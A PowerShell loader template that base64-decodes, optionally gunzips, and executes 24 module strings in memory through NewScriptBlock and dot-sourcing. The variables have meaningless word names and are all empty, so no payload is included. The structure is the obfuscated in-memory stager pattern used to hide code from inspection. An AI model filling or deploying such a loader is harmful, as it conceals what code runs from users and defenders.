#Requires -Version 2

$Extracting = ""
$Intonation = ""
$Fussbudget = ""
$Extraneous = ""
$Demolition = ""
$Sheepskins = ""
$Cavalcades = ""
$Tunelessly = ""
$Retrogress = ""
$Militiamen = ""
$Submission = ""
$Refocusing = ""
$Refinances = ""
$Manitoulin = ""
$Unpunished = ""
$Mitigating = ""
$Transfixes = ""
$Lavishness = ""
$Sarcophagi = ""
$Aesthetics = ""
$Archeology = ""
$Importuned = ""
$Blissfully = ""
$Spottiness = ""

$Modules = @($Extracting,$Intonation,$Fussbudget,$Extraneous,$Demolition,$Sheepskins,$Cavalcades,$Tunelessly,$Retrogress,$Militiamen,$Submission,$Refocusing,$Refinances,$Manitoulin,$Unpunished,$Mitigating,$Transfixes,$Lavishness,$Sarcophagi,$Aesthetics,$Archeology,$Importuned,$Blissfully,$Spottiness)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
}
